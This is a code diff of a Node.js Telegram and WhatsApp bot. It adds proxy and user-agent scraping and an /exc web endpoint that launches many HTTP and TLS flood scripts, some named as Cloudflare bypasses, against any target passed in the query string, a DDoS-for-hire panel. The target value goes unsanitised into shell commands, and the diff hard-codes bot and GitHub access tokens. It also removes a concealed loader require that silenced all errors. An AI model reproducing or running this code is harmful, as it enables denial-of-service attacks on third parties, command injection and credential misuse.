@@ -1,12 +1,7 @@
-require("./index2.js");
-process.on('unhandledRejection', () => {});
-process.on('uncaughtException', () => {});
-process.on('warning', () => {});
-console.error = () => {};
-console.warn = () => {};
+
 const TelegramBot = require("node-telegram-bot-api");
 const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
-const BOT_TOKEN = "8401366222:AAH_GA1TnVbZ3iYtJYRlYmxL7I_GwgLgRu0"; // token bot 
+const BOT_TOKEN = "8203081306:AAG9iPeuBfOyGtzh2jsqkAy_XfxAq4Ypa2Q"; // token bot 
 const express = require('express');
 const cors = require('cors');
 const app = express();
@@ -17,6 +12,20 @@ app.use(express.static('./assets/index.html'));
 app.use(cookieParser());
 app.use(cors());
 app.use(express.static(path.join(__dirname, "assets", 'index.html')));
+const proxyUrls = [
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+  "https://multiproxy.org/txt_all/proxy.txt",
+  "https://rootjazz.com/proxies/proxies.txt",
+  "https://api.openproxylist.xyz/http.txt",
+  "https://api.openproxylist.xyz/https.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+  "https://spys.me/proxy.txt"
+];
 const fs = require("fs-extra");
 const P = require("pino");
 const fetch = require("node-fetch");
@@ -226,7 +235,58 @@ Code : ${formattedCode}
   return sock;
 }
 
-const OWNER_ID = 7807425271
+const proxyUrls = [
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+  "https://multiproxy.org/txt_all/proxy.txt",
+  "https://rootjazz.com/proxies/proxies.txt",
+  "https://api.openproxylist.xyz/http.txt",
+  "https://api.openproxylist.xyz/https.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+  "https://spys.me/proxy.txt"
+];
+async function scrapeProxy() {
+  try {
+    let allData = "";
+
+    for (const url of proxyUrls) {
+      try {
+        const response = await fetch(url);
+        const data = await response.text();
+        allData += data + "\n";
+      } catch (err) {
+        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
+      }
+    }
+
+    fs.writeFileSync("proxy.txt", allData, "utf-8");
+    console.log("Semua proxy berhasil disimpan ke proxy.txt");
+  } catch (error) {
+    console.error(`Error: ${error.message}`);
+  }
+}
+
+async function scrapeUserAgent() {
+  try {
+    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
+    const data = await response.text();
+    fs.writeFileSync('ua.txt', data, 'utf-8');
+  } catch (error) {
+    console.error(`Error fetching data: ${error.message}`);
+  }
+}
+async function fetchData() {
+  const response = await fetch('https://httpbin.org/get');
+  const data = await response.json();
+  console.log(`Copy : http://${data.origin}:${port}`);
+  return data;
+}
+
+const OWNER_ID = 7257623756
 const dbFile = "./assets/pangkat.json";
 function loadpangkat() {
   if (!fs.existsSync(dbFile)) {
@@ -263,7 +323,7 @@ function getTargetId(msg) {
 
 //AKUN MMENU 
 
-const GITHUB_REPO = 'jarzzstock123-sys/Jarzz1';
+const GITHUB_REPO = 'VonziePemula';
 const GITHUB_FILE_PATH = 'app.json';
 const GITHUB_TOKEN = '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';
 
@@ -955,6 +1015,19 @@ if (!isOwnerMain(msg.from.id)) {
         });
     });
     
+bot.onText(/\/Xget/, async (msg) => {
+if (!isOwnerMain(msg.from.id)) {
+    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
+  }
+    const response = await fetch('https://httpbin.org/get');
+    const data = await response.json();
+    const ip = data.origin;
+   await bot.sendMessage(msg.chat.id, `http://${ip}:${PORT}/web`, {
+        reply_to_message_id: msg.message_id,
+        parse_mode: "HTML",
+        });
+    });    
+    
 bot.onText(/\/Xsender/, async (msg) => {
 if (!isOwnerMain(msg.from.id)) {
     return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
@@ -1291,12 +1364,89 @@ bot.onText(/^\/TestFunc\s+(\d+)\s+([\s\S]+)/i, async (msg, match) => {
     }
   }
 });
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, "assets", "index.html"));
-});
 
 app.get('/web', (req, res) => {
   res.sendFile(path.join(__dirname, "assets", "index.html"));
+});
+
+app.get('/exc', (req, res) => {
+  const { target, time, methods } = req.query;
+  res.status(200).json({
+    message: 'API request received. Executing script shortly, By Snith #Exercist',
+    target,
+    time,
+    methods
+  });  
+  if (methods === 'kill') {
+    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
+    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+   } else if (methods === 'KOMIX') {
+    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
+    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
+    } else if (methods === 'R2') {
+    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    } else if (methods === 'PSHT') {
+    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
+    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
+    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
+    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+   } else if (methods === 'pidoras') {
+    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
+    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
+    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
+    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
+    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+   } else if (methods === 'exercist') {
+    exec(`node ./assets/methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
+    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
+    exec(`node ./assets/methods/FLUTRA.js ${target} ${time}`);
+    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
+    exec(`node ./assets/methods/CFbypass.js ${target} ${time}`);
+    exec(`node ./assets/methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
+    exec(`node ./assets/methods/hyper.js ${target} ${time} 100`);
+    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
+    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/tls.vip ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+   } else {
+    console.log('Metode tidak dikenali atau format salah.');
+  }
 });
 
 app.get('/api', async (req, res) => {
